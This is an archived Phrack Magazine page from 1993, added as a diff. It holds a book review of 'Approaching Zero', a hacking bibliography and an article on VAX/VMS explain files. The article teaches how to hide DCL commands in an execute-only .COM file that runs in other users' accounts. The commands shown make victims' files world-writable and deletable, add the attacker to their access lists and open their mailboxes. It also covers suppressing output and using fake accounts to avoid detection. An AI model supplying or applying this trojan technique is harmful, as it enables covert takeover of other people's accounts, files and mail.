@@ -1,0 +1,1029 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: Line Noise Part II ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a class="current" href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack43.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack43.tar.gz" title="Get current issue tar.gz">43</a> | <strong>Release date</strong> : <b>1993-07-01</b> | <strong>Editor</strong> : <b>Erik Bloodaxe</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/43/1.html#article">Introduction</a></td><td align="right">Datastream Cowboy</td></tr>
+<tr><td align="left"><a href="../../issues/43/2.html#article">Phrack Loopback Part I</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/43/3.html#article">Phrack Loopback Part II / Editorial</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/43/4.html#article">Line Noise Part I</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/43/5.html#article">Line Noise Part II</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/43/6.html#article">Phrack Pro-Phile on Doctor Who</a></td><td align="right">Doctor Who</td></tr>
+<tr><td align="left"><a href="../../issues/43/7.html#article">Conference News Part I</a></td><td align="right">various</td></tr>
+<tr><td align="left"><a href="../../issues/43/8.html#article">Conference News Part II</a></td><td align="right">various</td></tr>
+<tr><td align="left"><a href="../../issues/43/9.html#article">How To Hack Blackjack (Part I)</a></td><td align="right">Lex Luthor</td></tr>
+<tr><td align="left"><a href="../../issues/43/10.html#article">How To Hack Blackjack (Part II)</a></td><td align="right">Lex Luthor</td></tr>
+<tr><td align="left"><a href="../../issues/43/11.html#article">Help for Verifying Novell Security</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/43/12.html#article">My Bust (Part I)</a></td><td align="right">Robert Clark</td></tr>
+<tr><td align="left"><a href="../../issues/43/13.html#article">My Bust (Part II)</a></td><td align="right">Robert Clark</td></tr>
+<tr><td align="left"><a href="../../issues/43/14.html#article">Playing Hide and Seek, Unix Style</a></td><td align="right">Phrack Accident</td></tr>
+<tr><td align="left"><a href="../../issues/43/15.html#article">Physical Access and Theft of PBX Systems</a></td><td align="right">Codec</td></tr>
+<tr><td align="left"><a href="../../issues/43/16.html#article">Guide to the 5ESS</a></td><td align="right">Firm G.R.A.S.P.</td></tr>
+<tr><td align="left"><a href="../../issues/43/17.html#article">Cellular Info</a></td><td align="right">Madjus</td></tr>
+<tr><td align="left"><a href="../../issues/43/18.html#article">LODCOM BBS Archive Information</a></td><td align="right">unknown</td></tr>
+<tr><td align="left"><a href="../../issues/43/19.html#article">LODCOM Sample Messages</a></td><td align="right">unknown</td></tr>
+<tr><td align="left"><a href="../../issues/43/20.html#article">Step By Step Guide To Stealing a Camaro</a></td><td align="right">Spy Ace</td></tr>
+<tr><td align="left"><a href="../../issues/43/21.html#article">Acronyms Part I</a></td><td align="right">Firm G.R.A.S.P.</td></tr>
+<tr><td align="left"><a href="../../issues/43/22.html#article">Acronyms Part II</a></td><td align="right">Firm G.R.A.S.P.</td></tr>
+<tr><td align="left"><a href="../../issues/43/23.html#article">Acronyms Part III</a></td><td align="right">Firm G.R.A.S.P.</td></tr>
+<tr><td align="left"><a href="../../issues/43/24.html#article">Acronyms Part IV</a></td><td align="right">Firm G.R.A.S.P.</td></tr>
+<tr><td align="left"><a href="../../issues/43/25.html#article">Acronyms Part V</a></td><td align="right">Firm G.R.A.S.P.</td></tr>
+<tr><td align="left"><a href="../../issues/43/26.html#article">International Scene</a></td><td align="right">various</td></tr>
+<tr><td align="left"><a href="../../issues/43/27.html#article">Phrack World News</a></td><td align="right">Datastream Cowboy</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : Line Noise Part II</div>
+<div class="opt-bottom"> <strong>Author</strong> : Phrack Staff</div>
+<pre>                         ==Phrack Magazine==
+
+              Volume Four, Issue Forty-Two, File 5 of 27
+
+
+                           //   //  /\   //   ====
+                          //   //  //\\ //   ====
+                         ==== //  //  \\/   ====
+
+                     /\   //  // \\    //  /===   ====
+                    //\\ //  //   //  //   \=\   ====
+                   //  \\/    \\ //  //   ===/  ====
+
+                                (cont)
+
+******************************************************************************
+
+    `'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'
+    '`                                            '`
+    `'             Approaching Reality:           `'
+    '`             ~~~~~~~~~~~~~~~~~~~~           '`
+    `'  A review of the new book Approaching Zero `'
+    '`  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ '`
+    `'                by Aleph One                `'
+    '`                ~~~~~~~~~~~~                '`
+    `'                                            `'
+    '`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`'`
+
+     When I started to read this book, I expected to read one more of the
+series of books that claim to be the &quot;definitive history of the computer
+underworld&quot; and the &quot;first book to define the technological subculture of
+phreaking, hacking, and virus writing&quot;.  After all what does a guy that
+writes for GQ, The Hollywood Reporter, Variety and Time know about the
+computer underground?  Well to my surprise the authors, Paul Mungo and
+Bryan Clough (a member of the Virus Strategy Group, which is coordinated by
+New Scotland Yard's Computer Crime Unit), did a pretty good job at presenting
+the facts as they are.  For the first time I heard a reporter and a
+computer crime expert give real figures at how much computer crime has
+really cost.  Other than a few minor technical errors and the fact that
+they fail to mention some people and groups (especially in the virus
+section), the book was enjoyable to read.
+
+    The book covers the history of the underground starting with its
+beginnings in the 60's, from phreaking to the adventures of Captain
+Crunch and the rest of the bunch to the not so long ago Operation Sundevil
+and the raids all over the country on members of the LOD, MOD and DPAC.
+It also goes through the events that led to the German hackers spy trials,
+and to the new generation of virus writers that are creating the new kind
+of living organisms that roam cyberspace.  They also discuss the gray
+scale that categorizes hackers, from the good hackers to the bad to the
+ones not that bad... those who are in it for profit and those who are
+in it to learn.  Hopefully all the readers of the book, hackers, security
+specialists, reporters and the general public will get a better
+understanding of what motivates hackers to do what they do by learning
+where they come from. To the hackers let them learn not to repeat their
+past errors.
+
+
+     I hope that the time of raids and sting operations has passed, but
+the late developments in the Washington 2600 meeting have pulled a shadow
+over my hopes.  Has no one learned?  Have the SS and FBI nothing better to
+do?  Just a few moths back someone pulled one of the greatest scams of all
+by setting up a fake ATM and stealing a few thousand dollars.  These are
+the kind of people the authorities should be after.  And to the hacker,
+don't sell yourself!  Remember this is a learning trip, once you start
+forgetting to learn and start making money out of it, it is just another
+job, an illegal one at that.
+
+     Approaching Zero was an exciting and interesting surprise.  It has
+given me the hint that maybe someone out there understands and I hope that
+everyone that reads it (and you must, you must read and learn all you can)
+will also understand.  I just leave you with these words:  Hacking comes
+from the heart - sometimes in the form of an obsession, sometimes in the
+form of a hobby - once that dies, there is nothing left to do.  No more
+traveling trough the nets!  No more exploring new systems!  You might as
+well turn the power off.
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+ What fallows is a list of books, papers and articles for those that
+want to know a little more of how the media portrays us, and a little more
+about the story of hacking in general.
+
+
+     Books:
+     ~~~~~~
+
+   - &quot;Approaching Zero&quot; by Paul Mungo &amp; Bryan Clough. Random House
+   1992.
+
+   - &quot;Beating the System&quot; by Owen Bowcott &amp; Sally Hamilton. London:
+    Bloomsbury, 1990.
+
+   - &quot;Computer Viruses - A High-Tech Disease&quot; by Ralf Burger. Grand
+    Rapids, MI: Abacus, 1988.
+
+   - &quot;The Hackers' Handbook&quot; by Hugo Cornwall. London: Century
+    Communications, 1985.
+
+   - &quot;Computers Under Attack&quot; by Peter Denning. Addison Wesley, 1990.
+
+   - &quot;Profits of Deceit&quot; by Patricia Franklin. London: William
+    Heinemann, 1990.
+
+   - &quot;Cyberpunk&quot; by Katie Hafner &amp; John Markoff. London: Fourth Estate,
+    1991.
+
+   - &quot;Out of the Inner Circle&quot; by Bill Landreth (aka The Cracker).
+    Redmond, WA.: Tempus Books, 1985.
+
+   - &quot;Sillicon Valley Fever&quot; by Judith K. Larsen &amp; Everett M. Rogers.
+    London: George Allen &amp; Unwin, 1985.
+
+   - &quot;Computer Viruses&quot; by Ralph Roberts. Greensboro, NC: Compute! Books,
+    1988.
+
+   - &quot;The Cuckoo's Egg&quot; by Clifford Stoll. New York: Doubleday, 1989.
+
+   - &quot;Spectacular Computer Crimes&quot; by Buck BloomBecker. Dow Jones-Irwin,
+    1990.
+
+   - &quot;The New Hacker's Dictionary&quot; by Eric Raymond. MIT Press, 1983.
+
+   - &quot;The Hacker Crackdown&quot; by Bruce Sterling. Bantam Books, 1992.
+
+   - &quot;The Little Black Book of Computer Viruses&quot; by Mark Ludwig. American
+    Eagle Publications, 1991.
+
+   - &quot;Artificial Life&quot; by Steven Levy. Panthenon, 1992. (For those virus
+    writers out there, use your tallen to create life.)
+
+
+     Articles &amp; Papers:
+     ~~~~~~~~~~~~~~~~~~
+
+   - &quot;Crime and Puzzlement&quot; by John Perry Barlow. Whole Earth Review,
+    Fall 1990: 44-57.
+
+   - &quot;The Casino Virus - Gambling with Your Hard Disk&quot; by Jim Bates.
+    Virus Bulletin, March 1991: 15-17.
+
+   - &quot;The TP Viruses&quot; by Vesselin Bontchev. Postings to Virus-L 1990.
+
+   - &quot;In Defense of Hackers&quot; by Craig Bromberg. The New York Times
+    Magazine, April 21, 1991.
+
+   - &quot;Bulgaria - The Dark Country&quot; by Bryan Clough. Virus Bulletin,
+    December 1990: 9-11.
+
+   - &quot;Voice Mail Computer Abuse Prosecution: United States v. Doucette
+    a/k/a Kyrie&quot; by William J. Cook. Safe Computing Proceedings of the
+    Fourth Annual Computer Virus &amp; Security Conference, 1991, Organized
+    by National Computing Corporation.
+
+   - &quot;Invasion of the Data Snatchers!&quot; by Philip Elmer-De Witt. Time,
+    September 26, 1988: 63.
+
+   - &quot;Data Exchange and How to Cope with This Problem: The Implication
+    of the German KGB Computer Espionage Affair&quot; by Hans Gliss. Paper
+    presented at Securicom Italia, October 1989.
+
+   - &quot;The Implications of the SPANet Hack.&quot; Computers Fraud &amp; Security
+    Bulletin, Vol. 10, No. 2, 1987.
+
+   - &quot;The Brain Virus: Fact and Fantasy&quot; by Harold J. Highland. Computers
+    &amp; Security, August 1988: 367-370.
+
+   - Computer Viruses - A Post Modern.&quot; Computer &amp; Security, April 1988:
+    117-184.
+
+   - &quot;Terminal Delinquents&quot; by Jack Hitt &amp; Paul Tough. Esquire, December
+    1990.
+
+   - &quot;The Social Organization of the Computer Underground&quot; by Gordon R.
+    Meyer. M.A. Thesis Submitted to the Graduate School, August 1989.
+
+   - &quot;Satanic Viruses&quot; by Paul Mungo. GQ, February 1991: 126-130.
+
+   - &quot;Secrets of the Little Blue Box&quot; by Ron Rosenbaum. Esquire, October
+    1971, Collected in Travels with Dr. Death. New York: Viking Penguin,
+    1991.
+
+   - &quot;The Worm Program - Early Experience with a Distributed
+    Computations&quot; by John F. Shoch. Communications of the ACM, Vol. 25,
+    No. 3, March 1982.
+
+   - &quot;The Search for Den Zuk&quot; by Fridrik Skulason. Virus Bulletin,
+    February 1991: 6-7.
+
+   - &quot;Crisis and Aftermath&quot; by Eugene H. Spafford. Communications of the
+    ACM. Vol. 32, No. 6, June 1989.
+
+   - &quot;GURPS Labor Lost: The Cyberpunk Bust&quot; by Bruce Sterling, Effector,
+    September 1991: 1.
+
+   - &quot;Stalking the Wily Hacker&quot; by Clifford Stoll. Communications of the
+    ACM. Vol. 31, No. 5, May 1988.
+
+   - &quot;The Kinetics of Computer Virus Replication.&quot; by Peter S. Tippett.
+    FundationWare, March 1990.
+
+   - &quot;The General and Logical Theory of Automata&quot; by John L. von Neumann.
+    Hixon Symposium, September 1948.
+
+   - &quot;Here Comes the Cyberpunk&quot; by Eden Restored. Time, February 8, 1993:
+    58-65.
+
+   - &quot;Surfing Off the Edge&quot; by Richard Begar. Time, February 8, 1993: 62.
+
+   - &quot;Can Hackers Be Sued for Damages Caused by Computer Viruses?&quot; by
+    Pamela Samuelson. Communications of the ACM. Vol. 32, No. 6, June
+    1989.
+
+   - &quot;Viruses and Criminal Law&quot; by Michael Gemignani. Communications of
+    the ACM. Vol. 32, No. 6, June 1989.
+
+   - &quot;Password Cracking: A Game of Wits&quot; by Donn Seeley. Communications
+    of the ACM. Vol. 32, No. 6, June 1989.
+
+   - &quot;The Cornell Commission: On Morris and the Worm&quot; by Ted Eisenberg,
+    David Gries, Juris Artmanis, Don Holcomb, M. Stuart Lynn &amp; Thomas
+    Santoro. Communications of the ACM. Vol. 32, No. 6, June 1989.
+
+   - &quot;Desperately Seeking Cyberspace&quot; by Paul Saffo. Personal Computing,
+    May 1989: 247-248.
+
+   - &quot;Secrets of the Software Pirates&quot; by Bylee Gomes. Esquire, January
+    1982: 58-64.
+
+   - &quot;Trouble in Cyberspace&quot; by Willard Uncapher. The Humanist,
+    September/October 1991: 5-14,34.
+
+   - &quot;Is Computer Hacking a Crime?&quot; Capture of a discussion held on the
+    WELL. Harper's Magazine, March 1990: 45-57.
+
+   - &quot;The United States vs. Craig Neidorf&quot; by Dorothy E. Denning.
+    Communications of the ACM, Vol. 34, No. 3, March 1991: 24-32.
+
+   - &quot;Colleagues Debate Denning's Comments.&quot; Communications of the ACM.
+    Vol. 34, No. 3, March 1991: 33-41.
+
+   - &quot;Denning's Rebutal&quot; by Dorothy E. Denning. Communications of the
+    ACM. Vol. 34, No. 3, March 1991: 42-43.
+
+   - &quot;Coming into the Country&quot; by John P. Barlow. Communications of the
+    ACM. Vol. 34, No. 3, March 1991: 19-21.
+
+   - &quot;Off the Hook&quot; by Julian Dibbell. Village Voice, August 21, 1990: 8.
+
+   - &quot;On Line and Out of Bounds&quot; by Julian Dibbell. Village Voice, July
+    24, 1990:27-32.
+
+  - &quot;Hi-Tech Mall Crawl&quot; by Julian Dibbell. Village Voice. March 1990: 12
+
+  - &quot;Samurai Hackers&quot; by Lynda Edwards. Rolling Stone, September 19,
+   1991: 67-69.
+
+  - &quot;Crackdown on hackers `may violate civil rights'&quot; by Dan Charles.
+   New Scientist, July 21, 1990: 22.
+
+  - &quot;United States v. Zod.&quot; The Economist, September 1, 1990: 23.
+
+  - &quot;Drop the Phone.&quot; Time, January 9, 1989: 49.
+
+  - &quot;Computer Recreations (Core War)&quot; by A. K. Dewdney. Scientific
+   American, May 1984: 14-21.
+
+  - &quot;Computer Recreations (Core War)&quot; by A. K. Dewdney. Scientific
+   American, March 1985: 14-23.
+
+  - &quot;Computer Recreations (Core War)&quot; by A. K. Dewdney. Scientific
+   American. March 1989: 110-113.
+
+  - &quot;Computer Security: NAS Sounds the Alarm&quot; by Eliot Marshall. Science,
+   Vol. 250: 1330.
+
+  - &quot;Students Discover Computer Threat&quot; by Gina Koda. Science, Vol. 215,
+   5 March, 1982: 1216-1217.
+
+  - &quot;A nationwide Computer-Fraud Ring Is Broken Up.&quot; The New York Times
+   National, Sunday, April 19, 1992.
+
+  - &quot;Hackers: Is a Cure Worse than the Disease?&quot; by Mark Lewyn. Business
+   Week, December 4, 1989: 37-38.
+
+  - &quot;Computer Hacking Goes to Trail&quot; by William F. Allman. U.S. News &amp;
+   World Report, January 22, 1990: 25.
+
+  - &quot;Morris Code: by Katie Hafner. The New Republican, February 19, 1990:
+   15-16.
+
+  - &quot;Hackers Intentions Key to Court Case&quot; by David Lindley. Nature. Vol.
+   340, August 3, 1989: 329.
+
+  - &quot;Problems of Security&quot; by David Lendley. Nature. Vol. 340. July 27,
+   1989: 252.
+
+  - &quot;Hostile Takeovers&quot; by Paul Wallich. Scientific American, January
+   1989: 22-23.
+
+  - &quot;The Worm's Aftermath&quot; by Eliot Marshall. Science, Vol. 242, November
+   25, 1988: 1121-1122
+
+  - &quot;Researcher Fear Computer Virus' Will Slow Use of National Network&quot;
+   by Calvin Sims.  The New York Times, Monday, November 14, 1998: B6.
+
+  - &quot;Networked Computers Hit by Intelligent `Virus'&quot; by Joseph Palca &amp;
+   Seth Shulman. Nature, Vol. 336, November 10, 1988: 97.
+
+  - &quot;The Science of Computing: Computer Viruses&quot; by Peter J. Denning.
+   American Scientist, Vol. 76, May-June 1988:236-238.
+
+  - &quot;Cyberpunks and the Constitution&quot; by Philip Elmer-Dewitt. Time, April
+   8, 1991:81.
+
+  - &quot;Plan to outlaw hacking.&quot; Nature, Vol. 341, October 19, 1989: 559.
+
+  - &quot;Computer System Intruder Plucks Passwords and Avoids Detection&quot; by
+   John Markoff. The New York Times National, Monday, March 19, 1990.
+
+  - &quot;Networked Computer Security&quot; by S.J. Buchsbaum. Vital Speeches of
+   the day. December 15, 1991: 150-155.
+
+  - &quot;Halting Hackers.&quot; The Economist. October 28, 1989: 18.
+
+  - &quot;Revenge of the Nerds&quot; by Nocholas Martin. The Washington Monthly,
+   January 1989: 21-24.
+
+  - &quot;Greater awareness of security in aftermath of computer worm&quot; by Seth
+   Shulman &amp; Joseph Palce. Nature, Vol. 336, November 1988: 301.
+
+  - &quot;Avoiding Virus Hysteria&quot; by Patrick Honan. Personal Computing, May
+   1989: 85-92.
+
+*****************************************************************************
+
+             {----------------------------------------------}
+             {                                              }
+             {       VMS/VAX Explain Files Explained        }
+             {                     or                       }
+             {      Security Holes in the VAX and DCL       }
+             {                                              }
+             {            By: The Arctic Knight             }
+             {                                              }
+             {----------------------------------------------}
+
+     VAX/VMS hacking has declined in popularity over the years due to the
+abundance of UNIX machines now available. It has even gotten bad press from
+fellow hackers. Included in this file is a security hole the size of , oh,
+any of the older IBM mainframes. With a little curiosity, persistence, and
+down right stubbornness I came across this rather obvious hole in the system.
+However, this hole may be so obvious that it has remained relatively hidden
+until now, especially since the decline of DCL users.
+     On most VAX systems, there is something called explain files.  These are
+usually help files that are made up by the system operators or borrowed from
+somewhere to help better explain the way certain features of the system work,
+whether they be general VAX commands, or system-specific programs.
+     When you are in your account (Presumably, a fake one, as this can be
+tracked down if you are foolish) type:
+
+$ explain index
+
+     and you will get a list of all the explain files on your system. Go ahead
+and take a look around these just to get a feel of what it looks like.  It
+should be a menu driven list of text files to view or programs to run(!!!).
+     Most system operators only set this up to show various text files
+describing commands like mentioned above. However, DCL .com files can be run
+from explain files as well. Now comes the fun. Many systems will also allow
+users to set up there own explain file. A really nice way to make it easy for
+other users to view text files or run programs that you have set for group or
+world access.
+     The first thing someone needs to do is make a file called INTRO.LKT which
+will contain whatever introduction text that you would like displayed before
+your explain file menu is displayed(i.e. you might have a description of
+yourself, your duties, or a funny poem, or WHATEVER YOU WANT THAT CAN BE
+CONTAINED IN A TEXT FILE!!!!)
+     You can use any editor to do this like EDT(a line editor) or TPU(a full
+screen editor). You will need to type something along these lines to create the
+file:
+
+$set vt=100         !if using a full screen editor like TPU
+$edit/tpu intro.lkt
+
+     After you are finished typing in the file, if you used TPU (A much better
+choice than EDT), you press &lt;CONTROL-Z&gt; to save the file. Now you must create
+a file called INDEX.LKI which will contain the file directories, filenames,
+and short descriptions of the files that you want to have displayed. You do
+this in the same manner as above, by entering an editor, and creating the file.
+
+$edit/tpu index.lki
+
+     Now, in this file the lines should look like the following:
+(File Directory)         (Filename)      (File Description)
+
+Phrack41.txt  A complete copy of Phrack 41 for your enjoyment.
+User:[aknight.hack]vms.txt A guide to hacking VMS systems.
+Temp$1:[aknight.ftp]ftplist.txt A list of FTP servers in-state.
+
+     Now, to explain these three lines. The first one will look for the program
+in your main directory. The second line will look for the program listed after
+it on the device called USER and in the HACK directory within the AKNIGHT
+directory. The final line will look on the device called TEMP$1 in the FTP
+directory within the AKNIGHT directory. Adding DCL programs will be explained
+in a minute, but first lets get this up and running.
+     Now, that you have typed in the text files you want, and saved this file
+you need to set the protection on your main directory and any others that need
+accessing like the text files to group and world access. For the above example
+one would want to type(assuming you are in your main directory):
+
+$set prot=(g:re,w:re) user:[000000]aknight.dir     !This is my main directory
+$set prot=(g:re,w:re) user:[aknight.hack]
+$set prot=(g:re,w:re) temp$1:[000000]aknight.dir   !My second storage device
+$set prot=(g:re,w:re) temp$1:[aknight.ftp]
+$set prot=(g:r,w:r)   phrack41.txt                 !Giving privs to read only
+$set prot=(g:r,w:r)   user:[aknight.hack]vms.txt
+$set prot=(g:r,w:r)   temp$1:[aknight.ftp]ftplist.txt
+
+     Now, if you type:
+
+$explain aknight              ! (my username in this instance,your normally)
+
+     You should get a print out to screen of your INTRO.LKT file and then a
+message along the lines of &quot;Hit &lt;return&gt; to continue&quot;. When you hit return a
+menu will appear very similar to the normal explain file menu except with your
+files listed and their descriptions which were accessed by the computer from
+your INDEX.LKI file. It would look like this(or something similar) in the above
+example.
+
+   {a print out of my INTRO.LKT file...}
+
+Hit &lt;RETURN&gt; to continue
+
+                             EXPLAIN AKNIGHT
+================================================================================
+(A) PHRACK41  T-A complete copy of Phrack 41 for your enjoyment.
+(B) VMS       T-A guide to hacking VMS systems.
+(C) *EXPLAIN/USER AKNIGHT FTPLIST
+              T-A list of FTP servers in-state.
+(Q) TERMINATE THIS PROGRAM
+================================================================================
+T = Text Display P = Program to be run
+(* = Related Information)
+Choose A-C, Q, oe type HELP for assistance.
+
+     Now you have an explain file. Pressing A-C will print those files to
+screen with pauses at each page if set up on your system/account to do so. I
+typed out number C the way I did, because when it has to access a directory
+other than it's main one, it will usually do this. I think there is away around
+this, but to be quite honest I haven't bothered figuring it out yet. When you
+quit, you will be dropped back off at your main prompt. The reason you need to
+set your protections, is because even thought from your account, it may look
+like it is working, if you don't set your protections as described above,
+NO ONE else will be able to view it!!
+     Now, comes the fun part. Putting DCL .COM files into your explain file.
+These are put into your index just like any text file. So you could type up a
+program to let someone copy the public files you have in your account to their
+directory, or something similar. The security flaw comes in here and it is
+a big one. Since a user is accessing your explain file from their account, any
+file that they run, issues commands in their account. So, one might plant a
+line in the middle of the above program that say something like:
+
+$set def sys$login                   !Returns them to their main directory.
+$set prot=(g:rwed,w:rwed) *.*;*      !Their files are now read, write, execute,
+                                     !and deleteable by anyone, including you.
+
+     Here is another idea. Say you create a text reader in DCL, to allow people
+to jump around in the text files you have, skip pages, etc. called TYPE.COM in
+your main directory. Anytime you can fool people into thinking that the
+computer is taking a little time to think, you can insert some major commands,
+i.e. when it is skipping pages, or coping files, which almost takes no time at
+all in reality. I STRONGLY suggest starting any program you plan to nest
+commands like this into with:
+
+$set noverify
+
+     Which will make sure that the program lines don't get printed to the
+screen as they are running. Another important command to know is the following
+which will cause the next text output from the VAX to be sent to a NULL device,
+so it will essentially be lost and not printed to the screen. So, if one is
+accessing someone's mailbox, you don't want a messaging appearing on screen
+saying that you have entered VAX/VMS mail or whatever. The command is:
+
+$assign nl:sys$output/user
+
+     If you forget the /user it will send the output to the null device for the
+session, instead of just one line.
+     Some other things one might do would be to add yourself to someone's
+ACL(access control list) by typing:
+
+$set acl/acl=(ident=[aknight],access=control) *.*;*
+
+     Now, this will give you access to all their files just as if you were the
+user, however if they bother to ever do a dir/prot command your username will
+be printed all over the screen, so one would suggest if you must do this, to
+use a fake account. Same with this below command:
+
+$assign nl:sys$output/user
+$mail set write aknight
+
+     The second line will give me read and write access to someone's mailbox,
+but once again if they bother to check their mailbox protections your username
+will be displayed.
+     In case, you haven't realized this yet, this all has A LOT of potential,
+and what I have mentioned here is just the tip of the iceberg and really mostly
+small and even foolish things to do, but the fact comes down to ANYTHING the
+user can do in their account, YOU can do in there account if you know the right
+commands and have the patience to nest them into a .COM file well enough.
+     When you have created the .COM file and added it to the INDEX.LKI file,
+then you will need to set the protection of the file like so:
+
+$set prot=(g:e,w:e) type.com                  !Execution only. No read privs.
+
+     You now have it a fully functional explain file that is only held down by
+your imagination.
+
+     Remember, malicious actions aren't the sign of a true hacker, so don't
+delete a users complete directory just because you want to show of your power.
